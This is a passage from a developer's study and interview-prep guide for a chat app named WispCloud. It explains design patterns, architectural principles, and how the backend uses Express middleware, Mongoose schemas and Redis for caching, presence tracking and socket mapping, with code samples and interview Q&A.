export const messageLimiter = createRateLimiter({
  windowMs: 60 * 1000,
  max: 50,
  message: 'Too many messages sent'
});
```

**Why:** DRY (Don't Repeat Yourself), configurable

### 7. Adapter Pattern

**What:** Make incompatible interfaces work together

**WispCloud Usage:**
- Socket.IO Redis Adapter
- Adapts Redis Pub/Sub to Socket.IO interface

**Example:**
```javascript
import { createAdapter } from '@socket.io/redis-adapter';

const pubClient = createClient({ url: REDIS_URL });
const subClient = pubClient.duplicate();

io.adapter(createAdapter(pubClient, subClient));
```

**Why:** Enables multi-instance Socket.IO scaling

### 8. Dependency Injection (Implicit)

**What:** Pass dependencies rather than create them

**WispCloud Usage:**
- Controllers receive models as imports
- Middleware receives Redis client via getter

**Example:**
```javascript
// Instead of this (tight coupling):
class MessageController {
  sendMessage() {
    const db = new MongoDB(); // Hard-coded
    db.save(message);
  }
}

// We do this (loose coupling):
import Message from '../models/message.model.js';

export const sendMessage = async (req, res) => {
  await Message.create(messageData); // Injected dependency
};
```

**Why:** Testable (can mock), flexible

---

## 2.4 Architectural Principles Applied

### 1. Separation of Concerns

**What:** Different parts of code handle different responsibilities

**WispCloud Implementation:**
- **Routes:** Define endpoints, not logic
- **Controllers:** Business logic, not data access
- **Models:** Data access, not business logic
- **Middleware:** Cross-cutting concerns (auth, validation)

**Example:**
```javascript
// ❌ BAD: Route does everything
router.post('/messages', async (req, res) => {
  const token = req.cookies.jwt;
  const user = jwt.verify(token);
  const message = new Message(req.body);
  await message.save();
  io.emit('newMessage', message);
  res.json(message);
});

// ✅ GOOD: Separated concerns
router.post('/messages',
  protectRoute,      // Auth concern
  messageLimiter,    // Rate limit concern
  sendMessage        // Business logic
);
```

### 2. DRY (Don't Repeat Yourself)

**What:** Avoid code duplication

**WispCloud Examples:**
- Rate limiter factory (one function, many limiters)
- Validation middleware (reusable across routes)
- Socket mapping functions (used in connect/disconnect)

### 3. SOLID Principles

#### Single Responsibility Principle
- Each controller handles one resource
- Each model represents one entity
- Each middleware has one job

#### Open/Closed Principle
- Rate limiter can be extended without modifying code
- New middleware can be added without changing existing

#### Liskov Substitution Principle
- Redis store can be swapped for memory store
- Socket.IO can fallback to polling

#### Interface Segregation Principle
- Middleware only exposes what it needs (req, res, next)
- Models only export necessary methods

#### Dependency Inversion Principle
- Controllers depend on model interfaces, not implementations
- High-level modules (controllers) don't depend on low-level (database)

### 4. Fail Fast

**What:** Catch errors early in the request

**WispCloud Implementation:**
- Validation happens before database queries
- Auth check happens before business logic
- Rate limiting happens before expensive operations

**Why:** Saves resources, better error messages

### 5. Graceful Degradation

**What:** System continues working when components fail

**WispCloud Examples:**
- If Redis fails, rate limiting falls back to memory
- If OAuth unavailable, email/password still works
- If Socket.IO fails, REST API still functions

**Example:**
```javascript
if (!isRedisConnected()) {
  console.warn('Using memory store');
  return rateLimit({ /* memory config */ });
}
```

### 6. Defense in Depth

**What:** Multiple layers of security

**WispCloud Layers:**
1. Rate limiting (prevent brute force)
2. Input validation (prevent injection)
3. Authentication (verify identity)
4. Authorization (check permissions)
5. HTTPS (encrypt in transit)
6. HTTP-only cookies (prevent XSS)
7. CORS (restrict origins)
8. Helmet.js (security headers)

### 7. Idempotency

**What:** Same request multiple times = same result

**WispCloud Examples:**
- GET requests are idempotent (reading doesn't change state)
- PUT requests for updates are idempotent
- POST for messages is NOT idempotent (creates duplicates if retried)

**Future Enhancement:** Add idempotency keys for message creation

### 8. Horizontal Scalability

**What:** Add more servers instead of bigger servers

**WispCloud Design:**
- Stateless REST API (can add more instances)
- Redis Adapter for Socket.IO (syncs across instances)
- Shared MongoDB (all instances read/write same data)
- Shared Redis (all instances share cache)

**Scaling Flow:**
```
Load Balancer
    ├─ Backend Instance 1 ──┐
    ├─ Backend Instance 2 ──┼── Redis Pub/Sub ── MongoDB
    └─ Backend Instance 3 ──┘
```

---

# CHAPTER 3: TECHNOLOGY DEEP-DIVE

## 3.1 Node.js & Express.js

### What is Node.js?

**Node.js** is a JavaScript runtime built on Chrome's V8 JavaScript engine. It allows you to execute JavaScript on the server side, outside of a browser environment.

**Key Characteristics:**
- **Single-threaded:** Uses one main thread with an event loop
- **Non-blocking I/O:** Asynchronous operations don't block execution
- **Event-driven:** Architecture based on events and callbacks
- **NPM ecosystem:** Access to 1.3+ million packages
- **Cross-platform:** Runs on Windows, macOS, Linux

**How Node.js Works:**
```javascript
// Traditional blocking I/O (synchronous)
const data = readFileSync('file.txt'); // Blocks until file is read
processData(data);

// Node.js non-blocking I/O (asynchronous)
readFile('file.txt', (err, data) => {
  processData(data); // Callback executes when ready
});
// Other code continues executing immediately
```

> **Key Concept:** Node.js is perfect for I/O-heavy applications (like chat apps) but not for CPU-intensive tasks (like video encoding). The event loop would be blocked during heavy computation.

### What is Express.js?

**Express.js** is a minimal and flexible Node.js web application framework that provides a robust set of features for building web and mobile applications.

**Core Features:**
- **Routing:** Define URL endpoints and handlers
- **Middleware:** Chain of functions that process requests
- **Template engines:** Support for rendering HTML (Pug, EJS, etc.)
- **Static file serving:** Serve CSS, JS, images
- **HTTP helpers:** Methods for handling requests and responses

**Basic Express Application:**
```javascript
import express from 'express';

const app = express();

// Middleware: Parse JSON bodies
app.use(express.json());

// Route: GET request
app.get('/api/users', (req, res) => {
  res.json({ users: ['Alice', 'Bob'] });
});

// Route: POST request
app.post('/api/users', (req, res) => {
  const user = req.body;
  res.status(201).json({ message: 'User created', user });
});

// Start server
app.listen(5001, () => {
  console.log('Server running on port 5001');
});
```

### Why We Chose Node.js & Express

**Alternatives Considered:**
1. **Python + Django/FastAPI**
   - Pros: Simpler syntax, better for data science
   - Cons: Slower than Node.js, less real-time support

2. **Go + Gin/Echo**
   - Pros: Extremely fast, compiled, concurrent
   - Cons: Smaller ecosystem, steeper learning curve

3. **Java + Spring Boot**
   - Pros: Enterprise-ready, strong typing
   - Cons: Verbose, heavy, slower development

**Why Node.js + Express Won:**
- **Same language:** JavaScript on frontend and backend (code reuse, easier context switching)
- **Real-time ready:** Excellent WebSocket support with Socket.IO
- **Fast for I/O:** Perfect for messaging platform (database queries, API calls)
- **Huge ecosystem:** NPM has packages for everything
- **Developer productivity:** Fast iteration, hot reloading, minimal boilerplate

> **Interview Tip:** When asked "Why Node.js?", emphasize the real-time requirements of a chat app and the advantage of using JavaScript everywhere.

### How We Use Node.js & Express in WispCloud

**WispCloud Express Application Structure:**

```javascript
// C:\Users\Nilansh\Desktop\WispCloud\backend\src\index.js (simplified)

import express from 'express';
import cookieParser from 'cookie-parser';
import cors from 'cors';
import helmet from 'helmet';

import authRoutes from './routes/auth.route.js';
import messageRoutes from './routes/messageRoutes.js';
import groupRoutes from './routes/group.routes.js';

import { connectDB } from './lib/db.js';
import { connectRedis } from './lib/redis.js';
import { server, initializeSocketIO } from './lib/socket.js';

const app = express();
const PORT = process.env.PORT || 5001;

// Security middleware
app.use(helmet()); // Sets security headers

// CORS configuration
app.use(cors({
  origin: process.env.FRONTEND_URL || 'http://localhost:5173',
  credentials: true // Allow cookies
}));

// Body parsing middleware
app.use(express.json({ limit: '10mb' })); // Parse JSON bodies
app.use(express.urlencoded({ extended: true })); // Parse URL-encoded bodies
app.use(cookieParser()); // Parse cookies

// Route registration
app.use('/api/auth', authRoutes);
app.use('/api/messages', messageRoutes);
app.use('/api/groups', groupRoutes);

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Error handling middleware (must be last)
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(err.status || 500).json({
    message: err.message || 'Internal server error'
  });
});

// Start server
server.listen(PORT, async () => {
  await connectDB(); // Connect to MongoDB
  await connectRedis(); // Connect to Redis
  await initializeSocketIO(); // Initialize Socket.IO with Redis adapter
  console.log(`Server running on port ${PORT}`);
});
```

**Middleware Stack Visualization:**
```
Request
   ↓
[Helmet] → Security headers
   ↓
[CORS] → Cross-origin validation
   ↓
[express.json()] → Parse JSON body
   ↓
[cookieParser()] → Parse cookies
   ↓
[globalLimiter] → Rate limiting (if route has it)
   ↓
[protectRoute] → JWT authentication (if route has it)
   ↓
[checkRole] → RBAC authorization (if route has it)
   ↓
[Controller] → Business logic
   ↓
Response
```

### Key Concepts You Need to Know

#### 1. Event Loop

**What:** The event loop is Node.js's mechanism for handling asynchronous operations.

**How it works:**
```
┌───────────────────────────┐
│        Call Stack         │ ← Synchronous code executes here
└───────────┬───────────────┘
            │
            ↓
┌───────────────────────────┐
│      Event Queue          │ ← Callbacks wait here
│  [callback1, callback2]   │
└───────────┬───────────────┘
            │
            ↓
        Event Loop ← Checks if call stack is empty, moves callbacks to stack
```

**Example:**
```javascript
console.log('1'); // Synchronous - executes immediately

setTimeout(() => {
  console.log('2'); // Asynchronous - goes to event queue
}, 0);

console.log('3'); // Synchronous - executes immediately

// Output: 1, 3, 2
// Even with 0ms timeout, callback waits for call stack to be empty
```

#### 2. Middleware Chain

**What:** Functions that have access to request, response, and next middleware.

**Pattern:**
```javascript
const middleware = (req, res, next) => {
  // Do something with req/res
  next(); // Pass to next middleware
};

// Or send response and stop chain
const middleware2 = (req, res, next) => {
  res.json({ error: 'Not allowed' }); // No next() = chain stops
};
```

**WispCloud Example:**
```javascript
// Route with multiple middleware
router.post('/messages/send/:userId',
  protectRoute,        // 1. Verify JWT, set req.user
  messageLimiter,      // 2. Check rate limit
  validate(schema),    // 3. Validate request body
  sendMessage          // 4. Controller (final handler)
);
```

#### 3. Request-Response Cycle

**Anatomy of a request:**
```javascript
// Request object (req)
{
  method: 'POST',
  url: '/api/messages/send/123',
  params: { userId: '123' },      // Route parameters
  query: { limit: '50' },         // Query string (?limit=50)
  body: { text: 'Hello' },        // Request body
  headers: { 'Content-Type': 'application/json' },
  cookies: { jwt: 'token123' },
  user: { _id: '456', email: 'user@example.com' } // Set by middleware
}

// Response object (res)
res.status(200).json({ message: 'Success' });
res.status(400).json({ error: 'Bad request' });
res.cookie('jwt', token, { httpOnly: true });
res.redirect('/login');
```

### Common Interview Questions

**Q1: What is the event loop in Node.js?**

**A:** The event loop is Node.js's mechanism for handling asynchronous operations without blocking the main thread. It continuously checks if the call stack is empty, then moves callbacks from the event queue to the call stack for execution. This allows Node.js to handle thousands of concurrent connections despite being single-threaded.

**Q2: How does Express middleware work?**

**A:** Middleware functions have access to `req`, `res`, and `next`. They execute in the order they're defined, forming a chain. Each middleware can:
1. Execute code
2. Modify req/res objects
3. End the request-response cycle (send response)
4. Call `next()` to pass control to the next middleware

If a middleware doesn't call `next()` or send a response, the request hangs.

**Q3: Why is Node.js single-threaded but handles concurrent connections?**

**A:** Node.js uses non-blocking I/O. When an async operation (like database query) starts, Node.js delegates it to the system kernel or thread pool, then continues processing other requests. When the operation completes, a callback is queued. This allows one thread to handle thousands of concurrent I/O operations without waiting.

**Q4: What's the difference between app.use() and app.get()?**

**A:**
- `app.use()`: Applies middleware to all routes or routes matching a path prefix
  ```javascript
  app.use(express.json()); // All routes
  app.use('/api', apiRoutes); // Routes starting with /api
  ```
- `app.get()`: Defines a route handler for GET requests to a specific path
  ```javascript
  app.get('/users', getUsers); // Only GET /users
  ```

**Q5: How do you handle errors in Express?**

**A:** Express uses error-handling middleware with four parameters:
```javascript
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(err.status || 500).json({
    message: err.message || 'Internal server error'
  });
});
```
This must be defined after all other routes. When you call `next(err)`, Express skips to error handlers.

> **Interview Tip:** Be ready to draw the event loop diagram and explain how a request flows through middleware stack.

---

## 3.2 MongoDB & Mongoose

### What is MongoDB?

**MongoDB** is a NoSQL document database that stores data in flexible, JSON-like documents called BSON (Binary JSON).

**Key Characteristics:**
- **Document-oriented:** Data stored as documents, not rows
- **Schema-less:** No rigid table structure (but we use schemas via Mongoose)
- **Horizontal scaling:** Built-in sharding support
- **Indexing:** Supports compound indexes, text indexes, geospatial
- **Aggregation:** Powerful query framework for data analysis

**Document Structure:**
```javascript
// Traditional SQL table row
id | name  | email           | created_at
1  | Alice | alice@email.com | 2024-01-01

// MongoDB document
{
  _id: ObjectId("507f1f77bcf86cd799439011"),
  name: "Alice",
  email: "alice@email.com",
  createdAt: ISODate("2024-01-01T00:00:00Z"),
  preferences: { theme: "dark", notifications: true }, // Nested object
  friends: ["Bob", "Charlie"] // Array
}
```

### What is Mongoose?

**Mongoose** is an Object Data Modeling (ODM) library for MongoDB and Node.js. It provides schema validation, query building, and middleware hooks.

**Why Mongoose over Native Driver:**
- **Schema validation:** Enforce data structure
- **Middleware hooks:** Pre/post save, validate, remove
- **Query builders:** Chainable query syntax
- **Virtual properties:** Computed fields
- **Populate:** Automatic reference resolution

**Basic Mongoose Schema:**
```javascript
import mongoose from 'mongoose';

const userSchema = new mongoose.Schema({
  email: {
    type: String,
    required: [true, 'Email is required'],
    unique: true,
    lowercase: true,
    validate: {
      validator: (v) => /\S+@\S+\.\S+/.test(v),
      message: 'Invalid email format'
    }
  },
  password: {
    type: String,
    required: true,
    minlength: 6
  },
  role: {
    type: String,
    enum: ['user', 'admin'],
    default: 'user'
  }
}, {
  timestamps: true // Auto-add createdAt, updatedAt
});

const User = mongoose.model('User', userSchema);
```

### Why We Chose MongoDB

**Alternatives Considered:**
1. **PostgreSQL (Relational)**
   - Pros: ACID transactions, strong consistency, complex queries
   - Cons: Rigid schema, harder to scale horizontally

2. **DynamoDB (NoSQL)**
   - Pros: Serverless, auto-scaling, low latency
   - Cons: Complex pricing, vendor lock-in, limited querying

3. **Cassandra (NoSQL)**
   - Pros: Extreme scalability, high availability
   - Cons: Eventual consistency, complex setup

**Why MongoDB Won:**
- **Flexible schema:** Chat messages have varying fields (text, image, entities, etc.)
- **Document model:** Maps naturally to JSON/JavaScript objects
- **Easy scaling:** Replica sets and sharding built-in
- **Rich queries:** Supports complex filtering, sorting, aggregation
- **Atlas free tier:** Managed hosting with 512MB free
- **Mongoose ODM:** Excellent TypeScript/JavaScript support

> **Key Concept:** For a chat app, MongoDB's document model is perfect because messages are self-contained documents. We don't need complex joins like in SQL.

### How We Use MongoDB in WispCloud

**Database Connection:**
```javascript
// C:\Users\Nilansh\Desktop\WispCloud\backend\src\lib\db.js

import mongoose from 'mongoose';

export const connectDB = async () => {
  try {
    const conn = await mongoose.connect(process.env.MONGODB_URI, {
      maxPoolSize: 10,        // Maximum 10 connections in pool
      minPoolSize: 5,         // Keep 5 connections alive
      socketTimeoutMS: 45000, // Close sockets after 45s
      serverSelectionTimeoutMS: 5000, // Fail fast if can't connect
    });

    console.log(`MongoDB connected: ${conn.connection.host}`);
  } catch (error) {
    console.error('MongoDB connection error:', error);
    process.exit(1); // Exit if database unavailable
  }
};
```

**Message Model (Real Example from Codebase):**
```javascript
// C:\Users\Nilansh\Desktop\WispCloud\backend\src\models\message.model.js

import mongoose from "mongoose";

const messageSchema = new mongoose.Schema(
  {
    senderId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",              // Reference to User collection
      required: true,
      index: true,              // Index for fast sender queries
    },
    receiverId: {
      type: mongoose.Schema.Types.ObjectId,
      required: true,
      index: true,              // Index for fast receiver queries
    },
    isGroupMessage: {
      type: Boolean,
      default: false,
      index: true,              // Index for filtering group vs DM
    },
    text: {
      type: String,
      trim: true,               // Remove whitespace
    },
    image: {
      type: String,             // Cloudinary URL
    },
    status: {
      type: String,
      enum: ['sent', 'delivered', 'read'],
      default: 'sent',
    },
    readAt: {
      type: Date,
    },
    // NLP fields for smart features
    sentiment: {
      type: String,
      enum: ['positive', 'negative', 'neutral'],
      default: 'neutral',
    },
    entities: [{
      type: { type: String, enum: ['person', 'place', 'organization'] },
      value: String,
    }],
    keywords: [String],
    importance: {
      type: Number,
      min: 0,
      max: 100,
      default: 50,
    },
  },
  {
    timestamps: true,           // Auto-add createdAt, updatedAt
  }
);

// Compound indexes for efficient queries
messageSchema.index({ senderId: 1, receiverId: 1, createdAt: -1 });
messageSchema.index({ receiverId: 1, senderId: 1, createdAt: -1 });
messageSchema.index({ receiverId: 1, status: 1 }); // Unread messages
messageSchema.index({ receiverId: 1, isGroupMessage: 1, createdAt: -1 });

const Message = mongoose.model("Message", messageSchema);
export default Message;
```

**Group Model (Real Example):**
```javascript
// C:\Users\Nilansh\Desktop\WispCloud\backend\src\models\group.model.js

const groupSchema = new mongoose.Schema(
  {
    name: {
      type: String,
      required: true,
      trim: true,
      minlength: 3,
      maxlength: 50,
    },
    description: {
      type: String,
      trim: true,
      maxlength: 500,
    },
    groupImage: {
      type: String,
      default: "",
    },
    createdBy: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      required: true,
      index: true,
    },
    type: {
      type: String,
      enum: ['public', 'private'],
      default: 'private',
    },
    maxMembers: {
      type: Number,
      default: 100,
      min: 2,
      max: 1000,
    },
    settings: {
      whoCanMessage: {
        type: String,
        enum: ['all', 'admins_only'],
        default: 'all',
      },
      whoCanAddMembers: {
        type: String,
        enum: ['all', 'admins_only', 'owner_only'],
        default: 'admins_only',
      },
      requireApproval: {
        type: Boolean,
        default: false,
      },
    },
    stats: {
      totalMembers: { type: Number, default: 1 },
      totalMessages: { type: Number, default: 0 },
    },
  },
  {
    timestamps: true,
  }
);

// Indexes
groupSchema.index({ type: 1 });
groupSchema.index({ createdAt: -1 });
groupSchema.index({ name: 'text', description: 'text' }); // Full-text search

const Group = mongoose.model("Group", groupSchema);
export default Group;
```

### Key Concepts

#### 1. ObjectId

**What:** MongoDB's unique identifier for documents.

```javascript
// ObjectId structure (24-character hex string)
ObjectId("507f1f77bcf86cd799439011")

// Breakdown:
// 507f1f77 - Timestamp (4 bytes)
// bcf86c - Machine identifier (3 bytes)
// d799 - Process ID (2 bytes)
// 439011 - Counter (3 bytes)

// Usage
const userId = new mongoose.Types.ObjectId();
// Convert string to ObjectId
const id = mongoose.Types.ObjectId("507f1f77bcf86cd799439011");
```

> **Key Concept:** ObjectIds are time-ordered. You can extract creation time: `objectId.getTimestamp()`

#### 2. Indexes

**What:** Data structures that improve query performance.

**Types We Use:**

**Single Field Index:**
```javascript
userSchema.index({ email: 1 }); // 1 = ascending, -1 = descending

// Query benefits from index
User.find({ email: 'alice@example.com' }); // O(log n) instead of O(n)
```

**Compound Index:**
```javascript
// Index on multiple fields
messageSchema.index({ senderId: 1, receiverId: 1, createdAt: -1 });

// Efficient for queries using these fields
Message.find({
  senderId: 'user123',
  receiverId: 'user456'
}).sort({ createdAt: -1 });
```

**Text Index:**
```javascript
// Full-text search
groupSchema.index({ name: 'text', description: 'text' });

// Search query
Group.find({ $text: { $search: "project team" } });
```

**TTL Index (Time To Live):**
```javascript
// Auto-delete documents after 30 days
sessionSchema.index({ createdAt: 1 }, { expireAfterSeconds: 2592000 });
```

> **Interview Tip:** Indexes speed up reads but slow down writes. Only index fields you frequently query.

#### 3. Populate (Joins in MongoDB)

**What:** Automatically replace references with actual documents.

```javascript
// Message has senderId reference
const message = await Message.findById(msgId);
console.log(message.senderId); // "507f1f77bcf86cd799439011"

// With populate
const message = await Message.findById(msgId).populate('senderId');
console.log(message.senderId); // { _id: "...", name: "Alice", email: "..." }

// Populate multiple fields with selection
const message = await Message.findById(msgId)
  .populate('senderId', 'name profilePic') // Only name and profilePic
  .populate('receiverId', '-password');    // Exclude password
```

**WispCloud Example:**
```javascript
// Get messages with sender details
const messages = await Message.find({
  senderId: userId,
  receiverId: otherUserId
})
.populate('senderId', 'username profilePic')
.sort({ createdAt: -1 })
.limit(50);

// Result:
// [
//   {
//     _id: "...",
//     text: "Hello",
//     senderId: { username: "alice", profilePic: "url" }, // Populated!
//     createdAt: "..."
//   }
// ]
```

#### 4. Aggregation Pipeline

**What:** Multi-stage data processing pipeline for complex queries.

**WispCloud Analytics Example:**
```javascript
// Get message count per user
const stats = await Message.aggregate([
  // Stage 1: Filter group messages
  {
    $match: { isGroupMessage: false }
  },
  // Stage 2: Group by sender and count
  {
    $group: {
      _id: '$senderId',
      messageCount: { $sum: 1 },
      lastMessage: { $max: '$createdAt' }
    }
  },
  // Stage 3: Sort by message count
  {
    $sort: { messageCount: -1 }
  },
  // Stage 4: Limit to top 10
  {
    $limit: 10
  },
  // Stage 5: Lookup user details
  {
    $lookup: {
      from: 'users',
      localField: '_id',
      foreignField: '_id',
      as: 'user'
    }
  }
]);

// Result:
// [
//   {
//     _id: "user123",
//     messageCount: 523,
//     lastMessage: "2024-01-15",
//     user: [{ name: "Alice", email: "..." }]
//   }
// ]
```

#### 5. Mongoose Middleware (Hooks)

**What:** Functions that run before/after certain operations.

```javascript
// Hash password before saving
userSchema.pre('save', async function(next) {
  // Only hash if password modified
  if (!this.isModified('password')) return next();

  this.password = await bcrypt.hash(this.password, 10);
  next();
});

// Clean up related data before deletion
userSchema.pre('remove', async function(next) {
  // Delete all messages sent by this user
  await Message.deleteMany({ senderId: this._id });
  next();
});

// Update stats after saving message
messageSchema.post('save', async function(doc) {
  if (doc.isGroupMessage) {
    await Group.findByIdAndUpdate(doc.receiverId, {
      $inc: { 'stats.totalMessages': 1 }
    });
  }
});
```

### Common Interview Questions

**Q1: MongoDB vs SQL databases?**

**A:**
- **MongoDB (NoSQL):**
  - Schema-less (flexible documents)
  - Horizontal scaling (sharding)
  - No complex joins
  - Eventual consistency (BASE)
  - Best for: Unstructured data, rapid development, horizontal scaling

- **SQL (Relational):**
  - Fixed schema (tables, columns)
  - Vertical scaling (bigger server)
  - Complex joins supported
  - ACID transactions
  - Best for: Structured data, complex relationships, strong consistency

For WispCloud, MongoDB's flexibility (messages with varying fields) and horizontal scaling made it ideal.

**Q2: How do indexes work in MongoDB?**

**A:** Indexes are B-tree data structures that store sorted references to documents. Instead of scanning every document (O(n)), MongoDB traverses the B-tree (O(log n)).

Example: Finding user by email without index scans 1 million users. With index, it takes ~20 comparisons (log₂ 1000000 ≈ 20).

Trade-off: Indexes speed up reads but slow writes (must update index on insert/update).

**Q3: What's the difference between embedding and referencing?**

**A:**
- **Embedding:** Store related data inside document
  ```javascript
  {
    _id: "user123",
    name: "Alice",
    address: { street: "123 Main St", city: "NYC" } // Embedded
  }
  ```
  Pros: One query, atomic updates
  Cons: Document size limit (16MB), data duplication

- **Referencing:** Store reference to another document
  ```javascript
  {
    _id: "msg123",
    text: "Hello",
    senderId: "user123" // Reference
  }
  ```
  Pros: No duplication, smaller documents
  Cons: Multiple queries (or populate)

WispCloud uses references for users (avoid duplication) and embedding for message entities (small, always accessed together).

**Q4: How does Mongoose validation work?**

**A:** Validation happens before saving:
1. Built-in validators (required, min, max, enum)
2. Custom validators (functions)
3. Runs on `save()` and `create()` (not `update()` by default)

```javascript
const schema = new Schema({
  age: {
    type: Number,
    min: [18, 'Must be 18+'],
    validate: {
      validator: (v) => v % 2 === 0,
      message: 'Age must be even'
    }
  }
});

// Triggers validation
await User.create({ age: 17 }); // Error: Must be 18+
await User.create({ age: 19 }); // Error: Age must be even
```

**Q5: How do you handle large result sets?**

**A:** Use cursor-based pagination:
```javascript
// Instead of skip (slow for large offsets)
Message.find().skip(10000).limit(50); // Scans 10000 documents!

// Use cursor (fast)
Message.find({ _id: { $lt: lastSeenId } })
  .limit(50)
  .sort({ _id: -1 });
```

For infinite scroll, return cursor (last ID) with results. Next request uses that cursor.

> **Interview Tip:** Draw a comparison table between MongoDB and SQL when asked about database choice.

---

## 3.3 Redis & Caching

### What is Redis?

**Redis** (Remote Dictionary Server) is an in-memory key-value data store. It's extremely fast because all data lives in RAM.

**Key Characteristics:**
- **In-memory:** Microsecond latency (vs milliseconds for disk)
- **Data structures:** Not just strings - lists, sets, hashes, sorted sets
- **Persistence:** Optional disk snapshots or append-only log
- **Pub/Sub:** Built-in messaging system
- **Atomic operations:** All commands are atomic
- **Single-threaded:** No race conditions (mostly)

**Speed Comparison:**
```
Redis (RAM):     ~0.1ms per operation
MongoDB (SSD):   ~10ms per operation
PostgreSQL:      ~10-50ms per operation

Redis is 100-500x faster for simple reads!
```

### What is Caching?

**Caching** is storing frequently accessed data in a faster storage layer to reduce load on the primary database.

**Cache Patterns:**

**1. Cache-Aside (Lazy Loading):**
```javascript
async function getUser(userId) {
  // 1. Try cache first
  const cached = await redis.get(`user:${userId}`);
  if (cached) return JSON.parse(cached);

  // 2. Cache miss - fetch from database
  const user = await User.findById(userId);

  // 3. Store in cache for next time
  await redis.setEx(`user:${userId}`, 300, JSON.stringify(user));

  return user;
}
```

**2. Write-Through:**
```javascript
async function updateUser(userId, data) {
  // 1. Update database
  const user = await User.findByIdAndUpdate(userId, data);

  // 2. Update cache immediately
  await redis.setEx(`user:${userId}`, 300, JSON.stringify(user));

  return user;
}
```

**3. Write-Behind (Async):**
```javascript
async function updateUser(userId, data) {
  // 1. Update cache immediately
  await redis.setEx(`user:${userId}`, 300, JSON.stringify(data));

  // 2. Queue database write (async)
  await queue.add('updateUser', { userId, data });
}
```

### Why We Chose Redis

**Alternatives Considered:**
1. **Memcached**
   - Pros: Simpler, slightly faster for pure caching
   - Cons: No Pub/Sub, no data structures (only strings)

2. **In-memory (Node.js Map)**
   - Pros: No external dependency
   - Cons: Doesn't work with multiple backend instances, lost on restart

3. **Hazelcast**
   - Pros: Distributed caching, Java-friendly
   - Cons: Heavy, complex, overkill for our use case

**Why Redis Won:**
- **Pub/Sub:** Critical for Socket.IO multi-instance scaling
- **Data structures:** Sets for online users, hashes for socket mappings
- **Persistence:** Can survive restarts
- **Rate limiting:** Atomic increment for distributed rate limits
- **Performance:** Handles millions of operations per second
- **Free tier:** Redis Cloud offers 30MB free

> **Key Concept:** Redis is not just a cache. We use it for presence tracking, Socket.IO scaling, rate limiting, and session storage.

### How We Use Redis in WispCloud

**Redis Connection (Real Code):**
```javascript
// C:\Users\Nilansh\Desktop\WispCloud\backend\src\lib\redis.js

import { createClient } from 'redis';

let redisClient = null;
let isConnected = false;

export const connectRedis = async () => {
  try {
    const redisUrl = process.env.REDIS_URL || 'redis://localhost:6379';

    redisClient = createClient({
      url: redisUrl,
      socket: {
        reconnectStrategy: (retries) => {
          if (retries > 3) {
            console.error('Redis: Too many retries');
            return new Error('Too many retries');
          }
          // Exponential backoff: 50ms, 100ms, 200ms
          return Math.min(retries * 50, 3000);
        }
      }
    });

    // Event handlers
    redisClient.on('error', (err) => {
      console.error('Redis error:', err.message);
      isConnected = false;
    });

    redisClient.on('ready', () => {
      console.log('✅ Redis connected');
      isConnected = true;
    });

    await redisClient.connect();
    return redisClient;
  } catch (error) {
    console.warn('⚠️  Redis unavailable - continuing without Redis');
    return null;
  }
};

export const getRedisClient = () => {
  if (!redisClient) throw new Error('Redis not initialized');
  return redisClient;
};

export const isRedisConnected = () => isConnected;
```

#### Use Case 1: User Caching

```javascript
// Cache user data with 5-minute TTL
export const cacheUser = async (userId, userData, ttl = 300) => {
  try {
    const client = getRedisClient();
    const key = `user:${userId}`;
    await client.setEx(key, ttl, JSON.stringify(userData));
  } catch (error) {
    console.error('Error caching user:', error);
  }
};

// Get cached user
export const getCachedUser = async (userId) => {
  try {
    const client = getRedisClient();
    const key = `user:${userId}`;
    const data = await client.get(key);
    return data ? JSON.parse(data) : null;
  } catch (error) {
    console.error('Error getting cached user:', error);
    return null;
  }
};

// Usage in controller
const getUser = async (userId) => {
  // Try cache first
  let user = await getCachedUser(userId);

  if (!user) {
    // Cache miss - query database
    user = await User.findById(userId);
    // Store in cache
    await cacheUser(userId, user);
  }

  return user;
};
```

**Why 5-minute TTL?**
- User data doesn't change frequently
- 5 minutes balances freshness and performance
- Auto-expire prevents stale data

#### Use Case 2: Online Presence Tracking

```javascript
// Set user online (add to Redis Set)
export const setUserOnline = async (userId) => {
  try {
    const client = getRedisClient();
    // Add to set of online users
    await client.sAdd('online_users', userId);
    // Update last seen timestamp
    await client.set(`user:${userId}:lastSeen`, Date.now().toString());
  } catch (error) {
    console.error('Error setting user online:', error);
  }
};

// Set user offline (remove from Set)
export const setUserOffline = async (userId) => {
  try {
    const client = getRedisClient();
    // Remove from set
    await client.sRem('online_users', userId);
    // Update last seen
    await client.set(`user:${userId}:lastSeen`, Date.now().toString());
  } catch (error) {
    console.error('Error setting user offline:', error);
  }
};

// Get all online users (O(n) but n is small)
export const getOnlineUsers = async () => {
  try {
    const client = getRedisClient();
    return await client.sMembers('online_users');
  } catch (error) {
    console.error('Error getting online users:', error);
    return [];
  }
};
```

**Redis Data Structures Used:**
```
online_users (Set):
  - "user123"
  - "user456"
  - "user789"

user:user123:lastSeen (String): "1699999999999"
user:user456:lastSeen (String): "1699999998888"
```

**Why a Set?**
- O(1) add/remove
- No duplicates automatically
- O(n) to get all members (fast since n < 10,000)

#### Use Case 3: Socket Mapping

```javascript
// Map socket ID to user ID (bidirectional)
export const mapSocketToUser = async (socketId, userId) => {
  try {
    const client = getRedisClient();
    // Hash map: socket ID → user ID
    await client.hSet('socket_user_map', socketId, userId);
    // String: user ID → socket ID
    await client.set(`user:${userId}:socketId`, socketId);
  } catch (error) {
    console.error('Error mapping socket:', error);
  }
};

// Get socket ID by user ID
export const getSocketIdByUserId = async (userId) => {
  try {
    const client = getRedisClient();
    return await client.get(`user:${userId}:socketId`);
  } catch (error) {
    return null;
  }
};

// Remove mapping on disconnect
export const removeSocketMapping = async (socketId) => {
  try {
    const client = getRedisClient();
    // Get user ID from hash
    const userId = await client.hGet('socket_user_map', socketId);
    if (userId) {
      // Remove both mappings
      await client.hDel('socket_user_map', socketId);
      await client.del(`user:${userId}:socketId`);
    }
  } catch (error) {
    console.error('Error removing socket mapping:', error);
  }
};
```

**Redis Data:**
```
socket_user_map (Hash):
  {
    "socket_abc123": "user123",
    "socket_def456": "user456"
  }

user:user123:socketId (String): "socket_abc123"
user:user456:socketId (String): "socket_def456"
```

**Why bidirectional?**
- **User → Socket:** To send message to specific user
- **Socket → User:** To identify user on disconnect

